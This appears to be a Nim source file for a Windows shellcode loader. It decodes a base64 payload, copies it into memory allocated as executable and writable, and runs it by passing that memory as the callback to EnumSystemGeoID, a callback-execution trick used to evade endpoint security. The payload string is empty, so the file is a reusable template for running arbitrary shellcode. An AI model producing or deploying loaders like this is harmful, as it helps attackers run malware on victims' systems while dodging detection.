import base64

import winim
import winim/lean

proc enumSystemGeoID[byte](shellcode: openArray[byte]): void =
  
  let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
  
  EnumSystemGeoID(
    16,
    0,
    cast[GEO_ENUMPROC](rPtr)
  ) 

when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = "" 

  let shellcode = toByteSeq(decode(enc))
  enumSystemGeoID(shellcode)
